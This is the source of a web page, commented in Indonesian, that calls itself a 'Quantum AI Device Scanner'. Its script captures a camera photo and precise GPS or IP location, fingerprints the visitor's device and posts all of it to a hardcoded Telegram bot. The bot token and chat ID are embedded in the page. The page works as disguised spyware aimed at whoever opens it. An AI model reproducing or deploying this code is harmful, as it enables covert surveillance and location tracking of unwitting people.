
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Quantum AI Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    /* Tambahan style untuk info perangkat */
    .device-info-panel {
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 15px;
      margin: 20px;
      max-width: 500px;
      text-align: left;
      display: none;
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
    }
    .info-item {
      padding: 8px;
      background: rgba(255,255,255,0.1);
      border-radius: 8px;
    }
    .gps-accuracy {
      display: inline-block;
      padding: 5px 10px;
      border-radius: 15px;
      background: #e67e22;
      margin-left: 10px;
    }
  </style>
  <!-- Style sebelumnya tetap dipertahankan -->
</head>
<body>
  <!-- Struktur HTML sebelumnya -->
  <div class="device-info-panel" id="device-info"></div>
<script>
    // ================== KONFIGURASI AWAL ==================
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isScanning = false;

    // ================== INISIALISASI KAMERA ==================
    async function initCamera() {
      try {
        const constraints = {
          video: {
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };

        // Fallback ke kamera depan untuk desktop
        if (!navigator.userAgent.match(/Mobile/)) {
          constraints.video.facingMode = 'user';
        }

        const stream = await navigator.mediaDevices.getUserMedia(constraints)
          .catch(async (error) => {
            // Fallback ke kamera depan jika gagal
            constraints.video.facingMode = 'user';
            return await navigator.mediaDevices.getUserMedia(constraints);
          });

        currentStream = stream;
        video.srcObject = stream;

        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });

        // Fix untuk autoplay iOS
        video.setAttribute('playsinline', 'true');
        video.muted = true;
        await video.play();
      } catch (error) {
        showError('Camera Error', 'Tidak dapat mengakses kamera');
      }
    }

    // ================== SISTEM GEOLOKASI HYBRID ==================
    async function getEnhancedLocation() {
      try {
        // GPS High Accuracy
        const gpsPosition = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            { enableHighAccuracy: true, timeout: 10000 }
          );
        });

        if (gpsPosition.coords.accuracy < 100) {
          return gpsPosition;
        }

        // Fallback ke IP Geolocation
        const ipPosition = await fetch('https://ipapi.co/json/')
          .then(res => res.json())
          .then(data => ({
            coords: {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: 5000
            }
          }));

        return ipPosition;
      } catch (error) {
        throw new Error('Gagal mendapatkan lokasi');
      }
    }

    // ================== DETEKSI PERANGKAT MULTI-PLATFORM ==================
    async function getUniversalDeviceInfo() {
      const info = {
        os: getOS(),
        platform: navigator.platform,
        browser: getBrowser(),
        ram: 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        battery: {},
        network: {},
        resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      // Deteksi Baterai
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = {
            level: `${Math.round(battery.level * 100)}%`,
            charging: battery.charging ? 'Charging' : 'Not Charging'
          };
        } catch (e) {
          info.battery.error = 'Not Supported';
        }
      }

      // Deteksi Jaringan
      if (navigator.connection) {
        const conn = navigator.connection;
        info.network = {
          type: conn.effectiveType,
          speed: `${conn.downlink} Mbps`
        };
      }

      // Deteksi GPU (Desktop only)
      if (!navigator.userAgent.match(/Mobile/)) {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl');
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          info.gpu = {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          };
        } catch (e) {
          info.gpu = 'Not Supported';
        }
      }

      return info;
    }

    // ================== FUNGSI UTAMA ==================
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [deviceInfo, location, image] = await Promise.all([
          getUniversalDeviceInfo(),
          getEnhancedLocation(),
          captureImage()
        ]);

        showDeviceInfo(deviceInfo, location);
        await sendReportToTelegram(image, deviceInfo, location);
        showToast('Laporan berhasil dikirim!');
      } catch (error) {
        showError('Error', error.message);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // ================== FUNGSI PENGIRIMAN TELEGRAM ==================
    async function sendReportToTelegram(image, deviceInfo, location) {
      const formData = new FormData();
      const blob = await dataURItoBlob(image);
      
      const caption = `üì± *Device Report*\n\n` +
        `üñ• OS: ${deviceInfo.os}\n` +
        `üåê Browser: ${deviceInfo.browser}\n` +
        `üß† RAM: ${deviceInfo.ram}\n` +
        `‚ö° Battery: ${deviceInfo.battery.level || 'N/A'}\n` +
        `üìç Location: ${location.coords.latitude.toFixed(6)}, ${location.coords.longitude.toFixed(6)}\n` +
        `üì∂ Network: ${deviceInfo.network.type || 'N/A'}`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'device_report.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) throw new Error('Gagal mengirim ke Telegram');
    }

    // ================== FUNGSI PENDUKUNG ==================
    function getOS() {
      const ua = navigator.userAgent;
      if (/Windows/.test(ua)) return 'Windows';
      if (/Android/.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
      if (/Mac/.test(ua)) return 'MacOS';
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown';
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (/Chrome/.test(ua)) return 'Chrome';
      if (/Firefox/.test(ua)) return 'Firefox';
      if (/Safari/.test(ua)) return 'Safari';
      if (/Edge/.test(ua)) return 'Edge';
      return 'Unknown';
    }

    // ... (Fungsi lainnya tetap sama dengan penyesuaian error handling)
  </script>
</body>
</html>
